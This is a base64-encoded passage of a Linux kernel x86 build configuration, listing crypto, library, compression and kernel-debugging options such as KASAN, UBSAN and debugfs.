cyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19TRVJQRU5UX1NTRTJfWDg2XzY0IGlzIG5vdCBzZXQK
IyBDT05GSUdfQ1JZUFRPX1NFUlBFTlRfQVZYX1g4Nl82NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NS
WVBUT19TRVJQRU5UX0FWWDJfWDg2XzY0IGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX1NNNF9B
RVNOSV9BVlhfWDg2XzY0IGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX1NNNF9BRVNOSV9BVlgy
X1g4Nl82NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19UV09GSVNIX1g4Nl82NCBpcyBub3Qg
c2V0CiMgQ09ORklHX0NSWVBUT19UV09GSVNIX1g4Nl82NF8zV0FZIGlzIG5vdCBzZXQKIyBDT05G
SUdfQ1JZUFRPX1RXT0ZJU0hfQVZYX1g4Nl82NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19B
UklBX0FFU05JX0FWWF9YODZfNjQgaXMgbm90IHNldAojIENPTkZJR19DUllQVE9fQVJJQV9BRVNO
SV9BVlgyX1g4Nl82NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19BUklBX0dGTklfQVZYNTEy
X1g4Nl82NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19DSEFDSEEyMF9YODZfNjQgaXMgbm90
IHNldAojIENPTkZJR19DUllQVE9fQUVHSVMxMjhfQUVTTklfU1NFMiBpcyBub3Qgc2V0CiMgQ09O
RklHX0NSWVBUT19OSFBPTFkxMzA1X1NTRTIgaXMgbm90IHNldAojIENPTkZJR19DUllQVE9fTkhQ
T0xZMTMwNV9BVlgyIGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX0JMQUtFMlNfWDg2IGlzIG5v
dCBzZXQKIyBDT05GSUdfQ1JZUFRPX1BPTFlWQUxfQ0xNVUxfTkkgaXMgbm90IHNldAojIENPTkZJ
R19DUllQVE9fUE9MWTEzMDVfWDg2XzY0IGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX1NIQTFf
U1NTRTMgaXMgbm90IHNldAojIENPTkZJR19DUllQVE9fU0hBMjU2X1NTU0UzIGlzIG5vdCBzZXQK
IyBDT05GSUdfQ1JZUFRPX1NIQTUxMl9TU1NFMyBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19T
TTNfQVZYX1g4Nl82NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19HSEFTSF9DTE1VTF9OSV9J
TlRFTCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19DUkMzMkNfSU5URUwgaXMgbm90IHNldAoj
IENPTkZJR19DUllQVE9fQ1JDMzJfUENMTVVMIGlzIG5vdCBzZXQKIyBlbmQgb2YgQWNjZWxlcmF0
ZWQgQ3J5cHRvZ3JhcGhpYyBBbGdvcml0aG1zIGZvciBDUFUgKHg4NikKCkNPTkZJR19DUllQVE9f
SFc9eQojIENPTkZJR19DUllQVE9fREVWX1BBRExPQ0sgaXMgbm90IHNldAojIENPTkZJR19DUllQ
VE9fREVWX0FUTUVMX0VDQyBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19ERVZfQVRNRUxfU0hB
MjA0QSBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19ERVZfQ0NQIGlzIG5vdCBzZXQKIyBDT05G
SUdfQ1JZUFRPX0RFVl9OSVRST1hfQ05ONTVYWCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19E
RVZfUUFUX0RIODk1eENDIGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX0RFVl9RQVRfQzNYWFgg
aXMgbm90IHNldAojIENPTkZJR19DUllQVE9fREVWX1FBVF9DNjJYIGlzIG5vdCBzZXQKIyBDT05G
SUdfQ1JZUFRPX0RFVl9RQVRfNFhYWCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19ERVZfUUFU
XzQyMFhYIGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX0RFVl9RQVRfREg4OTV4Q0NWRiBpcyBu
b3Qgc2V0CiMgQ09ORklHX0NSWVBUT19ERVZfUUFUX0MzWFhYVkYgaXMgbm90IHNldAojIENPTkZJ
R19DUllQVE9fREVWX1FBVF9DNjJYVkYgaXMgbm90IHNldAojIENPTkZJR19DUllQVE9fREVWX1ZJ
UlRJTyBpcyBub3Qgc2V0CiMgQ09ORklHX0NSWVBUT19ERVZfU0FGRVhDRUwgaXMgbm90IHNldAoj
IENPTkZJR19DUllQVE9fREVWX0FNTE9HSUNfR1hMIGlzIG5vdCBzZXQKQ09ORklHX0FTWU1NRVRS
SUNfS0VZX1RZUEU9eQpDT05GSUdfQVNZTU1FVFJJQ19QVUJMSUNfS0VZX1NVQlRZUEU9eQpDT05G
SUdfWDUwOV9DRVJUSUZJQ0FURV9QQVJTRVI9eQojIENPTkZJR19QS0NTOF9QUklWQVRFX0tFWV9Q
QVJTRVIgaXMgbm90IHNldApDT05GSUdfUEtDUzdfTUVTU0FHRV9QQVJTRVI9eQojIENPTkZJR19Q
S0NTN19URVNUX0tFWSBpcyBub3Qgc2V0CiMgQ09ORklHX1NJR05FRF9QRV9GSUxFX1ZFUklGSUNB
VElPTiBpcyBub3Qgc2V0CiMgQ09ORklHX0ZJUFNfU0lHTkFUVVJFX1NFTEZURVNUIGlzIG5vdCBz
ZXQKCiMKIyBDZXJ0aWZpY2F0ZXMgZm9yIHNpZ25hdHVyZSBjaGVja2luZwojCkNPTkZJR19TWVNU
RU1fVFJVU1RFRF9LRVlSSU5HPXkKQ09ORklHX1NZU1RFTV9UUlVTVEVEX0tFWVM9IiIKIyBDT05G
SUdfU1lTVEVNX0VYVFJBX0NFUlRJRklDQVRFIGlzIG5vdCBzZXQKIyBDT05GSUdfU0VDT05EQVJZ
X1RSVVNURURfS0VZUklORyBpcyBub3Qgc2V0CiMgQ09ORklHX1NZU1RFTV9CTEFDS0xJU1RfS0VZ
UklORyBpcyBub3Qgc2V0CiMgZW5kIG9mIENlcnRpZmljYXRlcyBmb3Igc2lnbmF0dXJlIGNoZWNr
aW5nCgpDT05GSUdfQklOQVJZX1BSSU5URj15CgojCiMgTGlicmFyeSByb3V0aW5lcwojCiMgQ09O
RklHX1BBQ0tJTkcgaXMgbm90IHNldApDT05GSUdfQklUUkVWRVJTRT15CkNPTkZJR19HRU5FUklD
X1NUUk5DUFlfRlJPTV9VU0VSPXkKQ09ORklHX0dFTkVSSUNfU1RSTkxFTl9VU0VSPXkKQ09ORklH
X0dFTkVSSUNfTkVUX1VUSUxTPXkKIyBDT05GSUdfQ09SRElDIGlzIG5vdCBzZXQKIyBDT05GSUdf
UFJJTUVfTlVNQkVSUyBpcyBub3Qgc2V0CkNPTkZJR19SQVRJT05BTD15CkNPTkZJR19HRU5FUklD
X0lPTUFQPXkKQ09ORklHX0FSQ0hfVVNFX0NNUFhDSEdfTE9DS1JFRj15CkNPTkZJR19BUkNIX0hB
U19GQVNUX01VTFRJUExJRVI9eQpDT05GSUdfQVJDSF9VU0VfU1lNX0FOTk9UQVRJT05TPXkKCiMK
IyBDcnlwdG8gbGlicmFyeSByb3V0aW5lcwojCkNPTkZJR19DUllQVE9fTElCX1VUSUxTPXkKQ09O
RklHX0NSWVBUT19MSUJfQUVTPXkKQ09ORklHX0NSWVBUT19MSUJfQVJDND15CkNPTkZJR19DUllQ
VE9fTElCX0dGMTI4TVVMPXkKQ09ORklHX0NSWVBUT19MSUJfQkxBS0UyU19HRU5FUklDPXkKIyBD
T05GSUdfQ1JZUFRPX0xJQl9DSEFDSEEgaXMgbm90IHNldAojIENPTkZJR19DUllQVE9fTElCX0NV
UlZFMjU1MTkgaXMgbm90IHNldApDT05GSUdfQ1JZUFRPX0xJQl9QT0xZMTMwNV9SU0laRT0xMQoj
IENPTkZJR19DUllQVE9fTElCX1BPTFkxMzA1IGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JZUFRPX0xJ
Ql9DSEFDSEEyMFBPTFkxMzA1IGlzIG5vdCBzZXQKQ09ORklHX0NSWVBUT19MSUJfU0hBMT15CkNP
TkZJR19DUllQVE9fTElCX1NIQTI1Nj15CiMgZW5kIG9mIENyeXB0byBsaWJyYXJ5IHJvdXRpbmVz
CgpDT05GSUdfQ1JDX0NDSVRUPXkKQ09ORklHX0NSQzE2PXkKIyBDT05GSUdfQ1JDX1QxMERJRiBp
cyBub3Qgc2V0CiMgQ09ORklHX0NSQzY0X1JPQ0tTT0ZUIGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JD
X0lUVV9UIGlzIG5vdCBzZXQKQ09ORklHX0NSQzMyPXkKIyBDT05GSUdfQ1JDMzJfU0VMRlRFU1Qg
aXMgbm90IHNldApDT05GSUdfQ1JDMzJfU0xJQ0VCWTg9eQojIENPTkZJR19DUkMzMl9TTElDRUJZ
NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NSQzMyX1NBUldBVEUgaXMgbm90IHNldAojIENPTkZJR19D
UkMzMl9CSVQgaXMgbm90IHNldAojIENPTkZJR19DUkM2NCBpcyBub3Qgc2V0CiMgQ09ORklHX0NS
QzQgaXMgbm90IHNldAojIENPTkZJR19DUkM3IGlzIG5vdCBzZXQKIyBDT05GSUdfTElCQ1JDMzJD
IGlzIG5vdCBzZXQKIyBDT05GSUdfQ1JDOCBpcyBub3Qgc2V0CkNPTkZJR19YWEhBU0g9eQojIENP
TkZJR19SQU5ET00zMl9TRUxGVEVTVCBpcyBub3Qgc2V0CkNPTkZJR19aTElCX0lORkxBVEU9eQpD
T05GSUdfWkxJQl9ERUZMQVRFPXkKQ09ORklHX0xaT19DT01QUkVTUz15CkNPTkZJR19MWk9fREVD
T01QUkVTUz15CkNPTkZJR19MWjRfREVDT01QUkVTUz15CkNPTkZJR19aU1REX0NPTU1PTj15CkNP
TkZJR19aU1REX0RFQ09NUFJFU1M9eQpDT05GSUdfWFpfREVDPXkKQ09ORklHX1haX0RFQ19YODY9
eQpDT05GSUdfWFpfREVDX1BPV0VSUEM9eQpDT05GSUdfWFpfREVDX0FSTT15CkNPTkZJR19YWl9E
RUNfQVJNVEhVTUI9eQpDT05GSUdfWFpfREVDX1NQQVJDPXkKIyBDT05GSUdfWFpfREVDX01JQ1JP
TFpNQSBpcyBub3Qgc2V0CkNPTkZJR19YWl9ERUNfQkNKPXkKIyBDT05GSUdfWFpfREVDX1RFU1Qg
aXMgbm90IHNldApDT05GSUdfREVDT01QUkVTU19HWklQPXkKQ09ORklHX0RFQ09NUFJFU1NfQlpJ
UDI9eQpDT05GSUdfREVDT01QUkVTU19MWk1BPXkKQ09ORklHX0RFQ09NUFJFU1NfWFo9eQpDT05G
SUdfREVDT01QUkVTU19MWk89eQpDT05GSUdfREVDT01QUkVTU19MWjQ9eQpDT05GSUdfREVDT01Q
UkVTU19aU1REPXkKQ09ORklHX0dFTkVSSUNfQUxMT0NBVE9SPXkKQ09ORklHX0lOVEVSVkFMX1RS
RUU9eQpDT05GSUdfWEFSUkFZX01VTFRJPXkKQ09ORklHX0FTU09DSUFUSVZFX0FSUkFZPXkKQ09O
RklHX0hBU19JT01FTT15CkNPTkZJR19IQVNfSU9QT1JUPXkKQ09ORklHX0hBU19JT1BPUlRfTUFQ
PXkKQ09ORklHX0hBU19ETUE9eQpDT05GSUdfRE1BX09QUz15CkNPTkZJR19ORUVEX1NHX0RNQV9G
TEFHUz15CkNPTkZJR19ORUVEX1NHX0RNQV9MRU5HVEg9eQpDT05GSUdfTkVFRF9ETUFfTUFQX1NU
QVRFPXkKQ09ORklHX0FSQ0hfRE1BX0FERFJfVF82NEJJVD15CkNPTkZJR19TV0lPVExCPXkKIyBD
T05GSUdfU1dJT1RMQl9EWU5BTUlDIGlzIG5vdCBzZXQKQ09ORklHX0RNQV9ORUVEX1NZTkM9eQoj
IENPTkZJR19ETUFfQVBJX0RFQlVHIGlzIG5vdCBzZXQKIyBDT05GSUdfRE1BX01BUF9CRU5DSE1B
UksgaXMgbm90IHNldApDT05GSUdfU0dMX0FMTE9DPXkKQ09ORklHX0NIRUNLX1NJR05BVFVSRT15
CkNPTkZJR19DUFVfUk1BUD15CkNPTkZJR19EUUw9eQpDT05GSUdfR0xPQj15CiMgQ09ORklHX0dM
T0JfU0VMRlRFU1QgaXMgbm90IHNldApDT05GSUdfTkxBVFRSPXkKQ09ORklHX0NMWl9UQUI9eQoj
IENPTkZJR19JUlFfUE9MTCBpcyBub3Qgc2V0CkNPTkZJR19NUElMSUI9eQpDT05GSUdfRElNTElC
PXkKQ09ORklHX09JRF9SRUdJU1RSWT15CkNPTkZJR19VQ1MyX1NUUklORz15CkNPTkZJR19IQVZF
X0dFTkVSSUNfVkRTTz15CkNPTkZJR19HRU5FUklDX0dFVFRJTUVPRkRBWT15CkNPTkZJR19HRU5F
UklDX1ZEU09fVElNRV9OUz15CkNPTkZJR19HRU5FUklDX1ZEU09fT1ZFUkZMT1dfUFJPVEVDVD15
CkNPTkZJR19WRFNPX0dFVFJBTkRPTT15CkNPTkZJR19GT05UX1NVUFBPUlQ9eQpDT05GSUdfRk9O
VF84eDE2PXkKQ09ORklHX0ZPTlRfQVVUT1NFTEVDVD15CkNPTkZJR19TR19QT09MPXkKQ09ORklH
X0FSQ0hfSEFTX1BNRU1fQVBJPXkKQ09ORklHX0FSQ0hfSEFTX0NQVV9DQUNIRV9JTlZBTElEQVRF
X01FTVJFR0lPTj15CkNPTkZJR19BUkNIX0hBU19VQUNDRVNTX0ZMVVNIQ0FDSEU9eQpDT05GSUdf
QVJDSF9IQVNfQ09QWV9NQz15CkNPTkZJR19BUkNIX1NUQUNLV0FMSz15CkNPTkZJR19TVEFDS0RF
UE9UPXkKQ09ORklHX1NUQUNLREVQT1RfQUxXQVlTX0lOSVQ9eQpDT05GSUdfU1RBQ0tERVBPVF9N
QVhfRlJBTUVTPTY0CkNPTkZJR19TQklUTUFQPXkKIyBDT05GSUdfTFdRX1RFU1QgaXMgbm90IHNl
dAojIGVuZCBvZiBMaWJyYXJ5IHJvdXRpbmVzCgpDT05GSUdfRklSTVdBUkVfVEFCTEU9eQoKIwoj
IEtlcm5lbCBoYWNraW5nCiMKCiMKIyBwcmludGsgYW5kIGRtZXNnIG9wdGlvbnMKIwpDT05GSUdf
UFJJTlRLX1RJTUU9eQojIENPTkZJR19QUklOVEtfQ0FMTEVSIGlzIG5vdCBzZXQKIyBDT05GSUdf
U1RBQ0tUUkFDRV9CVUlMRF9JRCBpcyBub3Qgc2V0CkNPTkZJR19DT05TT0xFX0xPR0xFVkVMX0RF
RkFVTFQ9NwpDT05GSUdfQ09OU09MRV9MT0dMRVZFTF9RVUlFVD00CkNPTkZJR19NRVNTQUdFX0xP
R0xFVkVMX0RFRkFVTFQ9NAojIENPTkZJR19CT09UX1BSSU5US19ERUxBWSBpcyBub3Qgc2V0CiMg
Q09ORklHX0RZTkFNSUNfREVCVUcgaXMgbm90IHNldAojIENPTkZJR19EWU5BTUlDX0RFQlVHX0NP
UkUgaXMgbm90IHNldApDT05GSUdfU1lNQk9MSUNfRVJSTkFNRT15CkNPTkZJR19ERUJVR19CVUdW
RVJCT1NFPXkKIyBlbmQgb2YgcHJpbnRrIGFuZCBkbWVzZyBvcHRpb25zCgpDT05GSUdfREVCVUdf
S0VSTkVMPXkKQ09ORklHX0RFQlVHX01JU0M9eQoKIwojIENvbXBpbGUtdGltZSBjaGVja3MgYW5k
IGNvbXBpbGVyIG9wdGlvbnMKIwpDT05GSUdfREVCVUdfSU5GTz15CkNPTkZJR19BU19IQVNfTk9O
X0NPTlNUX1VMRUIxMjg9eQojIENPTkZJR19ERUJVR19JTkZPX05PTkUgaXMgbm90IHNldAojIENP
TkZJR19ERUJVR19JTkZPX0RXQVJGX1RPT0xDSEFJTl9ERUZBVUxUIGlzIG5vdCBzZXQKQ09ORklH
X0RFQlVHX0lORk9fRFdBUkY0PXkKIyBDT05GSUdfREVCVUdfSU5GT19EV0FSRjUgaXMgbm90IHNl
dAojIENPTkZJR19ERUJVR19JTkZPX1JFRFVDRUQgaXMgbm90IHNldApDT05GSUdfREVCVUdfSU5G
T19DT01QUkVTU0VEX05PTkU9eQojIENPTkZJR19ERUJVR19JTkZPX0NPTVBSRVNTRURfWkxJQiBp
cyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX0lORk9fU1BMSVQgaXMgbm90IHNldAojIENPTkZJR19E
RUJVR19JTkZPX0JURiBpcyBub3Qgc2V0CkNPTkZJR19QQUhPTEVfSEFTX1NQTElUX0JURj15CkNP
TkZJR19QQUhPTEVfSEFTX0xBTkdfRVhDTFVERT15CiMgQ09ORklHX0dEQl9TQ1JJUFRTIGlzIG5v
dCBzZXQKQ09ORklHX0ZSQU1FX1dBUk49MjA0OAojIENPTkZJR19TVFJJUF9BU01fU1lNUyBpcyBu
b3Qgc2V0CiMgQ09ORklHX1JFQURBQkxFX0FTTSBpcyBub3Qgc2V0CiMgQ09ORklHX0hFQURFUlNf
SU5TVEFMTCBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX1NFQ1RJT05fTUlTTUFUQ0ggaXMgbm90
IHNldApDT05GSUdfU0VDVElPTl9NSVNNQVRDSF9XQVJOX09OTFk9eQpDT05GSUdfT0JKVE9PTD15
CkNPTkZJR19OT0lOU1RSX1ZBTElEQVRJT049eQojIENPTkZJR19ERUJVR19GT1JDRV9XRUFLX1BF
Ul9DUFUgaXMgbm90IHNldAojIGVuZCBvZiBDb21waWxlLXRpbWUgY2hlY2tzIGFuZCBjb21waWxl
ciBvcHRpb25zCgojCiMgR2VuZXJpYyBLZXJuZWwgRGVidWdnaW5nIEluc3RydW1lbnRzCiMKQ09O
RklHX01BR0lDX1NZU1JRPXkKQ09ORklHX01BR0lDX1NZU1JRX0RFRkFVTFRfRU5BQkxFPTB4MQpD
T05GSUdfTUFHSUNfU1lTUlFfU0VSSUFMPXkKQ09ORklHX01BR0lDX1NZU1JRX1NFUklBTF9TRVFV
RU5DRT0iIgpDT05GSUdfREVCVUdfRlM9eQpDT05GSUdfREVCVUdfRlNfQUxMT1dfQUxMPXkKIyBD
T05GSUdfREVCVUdfRlNfRElTQUxMT1dfTU9VTlQgaXMgbm90IHNldAojIENPTkZJR19ERUJVR19G
U19BTExPV19OT05FIGlzIG5vdCBzZXQKQ09ORklHX0hBVkVfQVJDSF9LR0RCPXkKIyBDT05GSUdf
S0dEQiBpcyBub3Qgc2V0CkNPTkZJR19BUkNIX0hBU19VQlNBTj15CkNPTkZJR19VQlNBTj15CiMg
Q09ORklHX1VCU0FOX1RSQVAgaXMgbm90IHNldApDT05GSUdfQ0NfSEFTX1VCU0FOX0JPVU5EU19T
VFJJQ1Q9eQpDT05GSUdfVUJTQU5fQk9VTkRTPXkKQ09ORklHX1VCU0FOX0JPVU5EU19TVFJJQ1Q9
eQpDT05GSUdfVUJTQU5fU0hJRlQ9eQpDT05GSUdfVUJTQU5fRElWX1pFUk89eQpDT05GSUdfVUJT
QU5fU0lHTkVEX1dSQVA9eQpDT05GSUdfVUJTQU5fQk9PTD15CkNPTkZJR19VQlNBTl9FTlVNPXkK
IyBDT05GSUdfVUJTQU5fQUxJR05NRU5UIGlzIG5vdCBzZXQKIyBDT05GSUdfVEVTVF9VQlNBTiBp
cyBub3Qgc2V0CkNPTkZJR19IQVZFX0FSQ0hfS0NTQU49eQpDT05GSUdfSEFWRV9LQ1NBTl9DT01Q
SUxFUj15CiMgZW5kIG9mIEdlbmVyaWMgS2VybmVsIERlYnVnZ2luZyBJbnN0cnVtZW50cwoKIwoj
IE5ldHdvcmtpbmcgRGVidWdnaW5nCiMKIyBDT05GSUdfTkVUX0RFVl9SRUZDTlRfVFJBQ0tFUiBp
cyBub3Qgc2V0CiMgQ09ORklHX05FVF9OU19SRUZDTlRfVFJBQ0tFUiBpcyBub3Qgc2V0CiMgQ09O
RklHX0RFQlVHX05FVCBpcyBub3Qgc2V0CiMgZW5kIG9mIE5ldHdvcmtpbmcgRGVidWdnaW5nCgoj
CiMgTWVtb3J5IERlYnVnZ2luZwojCiMgQ09ORklHX1BBR0VfRVhURU5TSU9OIGlzIG5vdCBzZXQK
IyBDT05GSUdfREVCVUdfUEFHRUFMTE9DIGlzIG5vdCBzZXQKQ09ORklHX1NMVUJfREVCVUc9eQoj
IENPTkZJR19TTFVCX0RFQlVHX09OIGlzIG5vdCBzZXQKIyBDT05GSUdfUEFHRV9PV05FUiBpcyBu
b3Qgc2V0CiMgQ09ORklHX1BBR0VfVEFCTEVfQ0hFQ0sgaXMgbm90IHNldAojIENPTkZJR19QQUdF
X1BPSVNPTklORyBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX1BBR0VfUkVGIGlzIG5vdCBzZXQK
IyBDT05GSUdfREVCVUdfUk9EQVRBX1RFU1QgaXMgbm90IHNldApDT05GSUdfQVJDSF9IQVNfREVC
VUdfV1g9eQpDT05GSUdfREVCVUdfV1g9eQpDT05GSUdfR0VORVJJQ19QVERVTVA9eQpDT05GSUdf
UFREVU1QX0NPUkU9eQojIENPTkZJR19QVERVTVBfREVCVUdGUyBpcyBub3Qgc2V0CkNPTkZJR19I
QVZFX0RFQlVHX0tNRU1MRUFLPXkKIyBDT05GSUdfREVCVUdfS01FTUxFQUsgaXMgbm90IHNldAoj
IENPTkZJR19QRVJfVk1BX0xPQ0tfU1RBVFMgaXMgbm90IHNldAojIENPTkZJR19ERUJVR19PQkpF
Q1RTIGlzIG5vdCBzZXQKIyBDT05GSUdfU0hSSU5LRVJfREVCVUcgaXMgbm90IHNldApDT05GSUdf
REVCVUdfU1RBQ0tfVVNBR0U9eQojIENPTkZJR19TQ0hFRF9TVEFDS19FTkRfQ0hFQ0sgaXMgbm90
IHNldApDT05GSUdfQVJDSF9IQVNfREVCVUdfVk1fUEdUQUJMRT15CiMgQ09ORklHX0RFQlVHX1ZN
IGlzIG5vdCBzZXQKIyBDT05GSUdfREVCVUdfVk1fUEdUQUJMRSBpcyBub3Qgc2V0CkNPTkZJR19B
UkNIX0hBU19ERUJVR19WSVJUVUFMPXkKIyBDT05GSUdfREVCVUdfVklSVFVBTCBpcyBub3Qgc2V0
CkNPTkZJR19ERUJVR19NRU1PUllfSU5JVD15CiMgQ09ORklHX0RFQlVHX1BFUl9DUFVfTUFQUyBp
cyBub3Qgc2V0CkNPTkZJR19BUkNIX1NVUFBPUlRTX0tNQVBfTE9DQUxfRk9SQ0VfTUFQPXkKIyBD
T05GSUdfREVCVUdfS01BUF9MT0NBTF9GT1JDRV9NQVAgaXMgbm90IHNldAojIENPTkZJR19NRU1f
QUxMT0NfUFJPRklMSU5HIGlzIG5vdCBzZXQKQ09ORklHX0hBVkVfQVJDSF9LQVNBTj15CkNPTkZJ
R19IQVZFX0FSQ0hfS0FTQU5fVk1BTExPQz15CkNPTkZJR19DQ19IQVNfS0FTQU5fR0VORVJJQz15
CkNPTkZJR19DQ19IQVNfV09SS0lOR19OT1NBTklUSVpFX0FERFJFU1M9eQpDT05GSUdfS0FTQU49
eQpDT05GSUdfS0FTQU5fR0VORVJJQz15CiMgQ09ORklHX0tBU0FOX09VVExJTkUgaXMgbm90IHNl
dApDT05GSUdfS0FTQU5fSU5MSU5FPXkKQ09ORklHX0tBU0FOX1NUQUNLPXkKIyBDT05GSUdfS0FT
QU5fVk1BTExPQyBpcyBub3Qgc2V0CiMgQ09ORklHX0tBU0FOX01PRFVMRV9URVNUIGlzIG5vdCBz
ZXQKIyBDT05GSUdfS0FTQU5fRVhUUkFfSU5GTyBpcyBub3Qgc2V0CkNPTkZJR19IQVZFX0FSQ0hf
S0ZFTkNFPXkKIyBDT05GSUdfS0ZFTkNFIGlzIG5vdCBzZXQKQ09ORklHX0hBVkVfQVJDSF9LTVNB
Tj15CiMgZW5kIG9mIE1lbW9yeSBEZWJ1Z2dpbmcKCiMgQ09ORklHX0RFQlVHX1NISVJRIGlzIG5v
dCBzZXQKCiMKIyBEZWJ1ZyBPb3BzLCBMb2NrdXBzIGFuZCBIYW5ncwojCiMgQ09ORklHX1BBTklD
X09OX09PUFMgaXMgbm90IHNldApDT05GSUdfUEFOSUNfT05fT09QU19WQUxVRT0wCkNPTkZJR19Q
QU5JQ19USU1FT1VUPTAKIyBDT05GSUdfU09GVExPQ0tVUF9ERVRFQ1RPUiBpcyBub3Qgc2V0CkNP
TkZJR19IQVZFX0hBUkRMT0NLVVBfREVURUNUT1JfQlVERFk9eQojIENPTkZJR19IQVJETE9DS1VQ
X0RFVEVDVE9SIGlzIG5vdCBzZXQKQ09ORklHX0hBUkRMT0NLVVBfQ0hFQ0tfVElNRVNUQU1QPXkK
IyBDT05GSUdfREVURUNUX0hVTkdfVEFTSyBpcyBub3Qgc2V0CiMgQ09ORklHX1dRX1dBVENIRE9H
IGlzIG5vdCBzZXQKIyBDT05GSUdfV1FfQ1BVX0lOVEVOU0lWRV9SRVBPUlQgaXMgbm90IHNldAoj
IENPTkZJR19URVNUX0xPQ0tVUCBpcyBub3Qgc2V0CiMgZW5kIG9mIERlYnVnIE9vcHMsIExvY2t1
cHMgYW5kIEhhbmdzCgojCiMgU2NoZWR1bGVyIERlYnVnZ2luZwojCiMgQ09ORklHX1NDSEVEX0RF
QlVHIGlzIG5vdCBzZXQKQ09ORklHX1NDSEVEX0lORk89eQpDT05GSUdfU0NIRURTVEFUUz15CiMg
ZW5kIG9mIFNjaGVkdWxlciBEZWJ1Z2dpbmcKCiMgQ09ORklHX0RFQlVHX1RJTUVLRUVQSU5HIGlz
IG5vdCBzZXQKIyBDT05GSUdfREVCVUdfUFJFRU1QVCBpcyBub3Qgc2V0CgojCiMgTG9jayBEZWJ1
Z2dpbmcgKHNwaW5sb2NrcywgbXV0ZXhlcywgZXRjLi4uKQojCkNPTkZJR19MT0NLX0RFQlVHR0lO
R19TVVBQT1JUPXkKIyBDT05GSUdfUFJPVkVfTE9DS0lORyBpcyBub3Qgc2V0CiMgQ09ORklHX0xP
Q0tfU1RBVCBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX1JUX01VVEVYRVMgaXMgbm90IHNldAoj
IENPTkZJR19ERUJVR19TUElOTE9DSyBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX01VVEVYRVMg
aXMgbm90IHNldAojIENPTkZJR19ERUJVR19XV19NVVRFWF9TTE9XUEFUSCBpcyBub3Qgc2V0CiMg
Q09ORklHX0RFQlVHX1JXU0VNUyBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX0xPQ0tfQUxMT0Mg
aXMgbm90IHNldAojIENPTkZJR19ERUJVR19BVE9NSUNfU0xFRVAgaXMgbm90IHNldAojIENPTkZJ
R19ERUJVR19MT0NLSU5HX0FQSV9TRUxGVEVTVFMgaXMgbm90IHNldAojIENPTkZJR19MT0NLX1RP
UlRVUkVfVEVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX1dXX01VVEVYX1NFTEZURVNUIGlzIG5vdCBz
ZXQKIyBDT05GSUdfU0NGX1RPUlRVUkVfVEVTVCBpcyBub3Qgc2V0CiMgQ09ORklHX0NTRF9MT0NL
X1dBSVRfREVCVUcgaXMgbm90IHNldAojIGVuZCBvZiBMb2NrIERlYnVnZ2luZyAoc3BpbmxvY2tz
LCBtdXRleGVzLCBldGMuLi4pCgojIENPTkZJR19OTUlfQ0hFQ0tfQ1BVIGlzIG5vdCBzZXQKIyBD
T05GSUdfREVCVUdfSVJRRkxBR1MgaXMgbm90IHNldApDT05GSUdfU1RBQ0tUUkFDRT15CiMgQ09O
RklHX1dBUk5fQUxMX1VOU0VFREVEX1JBTkRPTSBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX0tP
QkpFQ1QgaXMgbm90IHNldAoKIwojIERlYnVnIGtlcm5lbCBkYXRhIHN0cnVjdHVyZXMKIwojIENP
TkZJR19ERUJVR19MSVNUIGlzIG5vdCBzZXQKIyBDT05GSUdfREVCVUdfUExJU1QgaXMgbm90IHNl
dAojIENPTkZJR19ERUJVR19TRyBpcyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX05PVElGSUVSUyBp
cyBub3Qgc2V0CiMgQ09ORklHX0RFQlVHX01BUExFX1RSRUUgaXMgbm90IHNldAojIGVuZCBvZiBE
ZWJ1ZyBrZXJuZWwgZGF0YSBzdHJ1Y3R1cmVzCgojCiMgUkNVIERlYnVnZ2luZwojCiMgQ09ORklH
X1JDVV9TQ0FMRV9URVNUIGlzIG5vdCBzZXQKIyBDT05GSUdfUkNVX1RPUlRVUkVfVEVTVCBpcyBu
b3Qgc2V0CiMgQ09ORklHX1JDVV9SRUZfU0NBTEVfVEVTVCBpcyBub3Qgc2V0CkNPTkZJR19SQ1Vf
Q1BVX1NUQUxMX1RJTUVPVVQ9MjEKQ09ORklHX1JDVV9FWFBfQ1BVX1NUQUxMX1RJTUVPVVQ9MAoj
IENPTkZJR19SQ1VfQ1BVX1NUQUxMX0NQVVRJTUUgaXMgbm90IHNldApDT05GSUdfUkNVX1RSQUNF
PXkKIyBDT05GSUdfUkNVX0VRU19ERUJVRyBpcyBub3Qgc2V0CiMgZW5kIG9mIFJDVSBEZWJ1Z2dp
bmcKCiMgQ09ORklHX0RFQlVHX1dRX0ZPUkNFX1JSX0NQVSBpcyBub3Qgc2V0CiMgQ09ORklHX0NQ
VV9IT1RQTFVHX1NUQVRFX0NPTlRST0wgaXMgbm90IHNldAojIENPTkZJR19MQVRFTkNZVE9QIGlz
